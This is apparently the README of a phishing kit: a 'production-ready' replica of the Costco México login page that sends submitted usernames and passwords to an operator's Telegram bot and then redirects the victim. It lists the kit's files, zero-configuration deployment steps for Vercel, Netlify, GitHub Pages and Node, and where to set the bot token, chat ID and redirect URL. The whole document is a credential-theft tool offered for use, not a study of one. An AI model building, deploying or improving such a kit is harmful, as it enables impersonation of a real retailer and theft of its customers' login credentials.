# Costco México Login Page (Telegram Bot Integrated)

Production-ready, responsive replica of the Costco México login experience with real-time Telegram Bot submission and automatic URL redirection.

---

## 📁 File Structure

```
├── images/
│   ├── 1.png             # Costco Wholesale header logo
│   ├── 1.svg             # "Iniciar sesión" header title
│   ├── 2.svg             # Username placeholder
│   ├── 3.svg             # Password placeholder
│   ├── 4.svg             # Sucursal placeholder (footer)
│   ├── 5.svg             # Newsletter placeholder (footer)
│   └── LogoCostco.png    # High-res logo backup
├── api/
│   ├── send.js           # Vercel & Node serverless form handler
│   └── config.js         # Serverless config endpoint
├── netlify/
│   └── functions/
│       ├── send.js       # Netlify serverless function
│       └── config.js     # Netlify config function
├── config.js             # Single config file (Bot token, Chat ID, Redirect URL)
├── index.html            # Main site HTML, CSS, and client-side logic
├── netlify.toml          # Netlify configuration and rewrites
├── package.json          # Node package configuration
├── server.js             # Local development & production Node server
└── vercel.json           # Vercel configuration and rewrites
```

---

## 🚀 Drag-and-Drop Deployment Options

This project is configured so that you can simply drag and drop the folder onto any of the following platforms with **zero configuration required**:

### 1. Vercel
- **Option A (Vercel Drag & Drop / Dashboard):** Go to [vercel.com/new](https://vercel.com/new), drag and drop this folder or import your Git repository. Vercel automatically detects `vercel.json` and builds the serverless API `/api/send`.
- **Option B (Vercel CLI):** Run `vercel` from the project directory.

### 2. Netlify
- **Option A (Netlify Drop):** Go to [app.netlify.com/drop](https://app.netlify.com/drop) and drag-and-drop this entire folder. Netlify immediately publishes the site.
- **Dual Mode:** If deployed statically via Netlify Drop, form submissions send directly to Telegram via client-side fallback. If deployed via Git or Netlify CLI, `netlify/functions/send.js` securely handles submissions on the server side.

### 3. GitHub Pages
- Push this repository to GitHub or upload the files via GitHub web interface.
- Go to your repository **Settings** -> **Pages**.
- Under **Branch**, select `main` (or `master`) and folder `/ (root)`, then click **Save**.
- Submissions will automatically send directly to your Telegram Bot from the browser and redirect seamlessly.

### 4. Local Node.js Server
- Run without installing any third-party dependencies:
  ```bash
  npm start
  # or
  node server.js
  ```
- Open `http://localhost:3000` in your web browser.

---

## ⚙️ Configuration

Open `config.js` to change:
- `TELEGRAM_BOT_TOKEN`: Your Telegram Bot API token from `@BotFather`.
- `TELEGRAM_CHAT_ID`: Your target chat/channel ID (or user ID from `@userinfobot`).
- `REDIRECT_URL`: The destination URL where users are forwarded upon form submission.
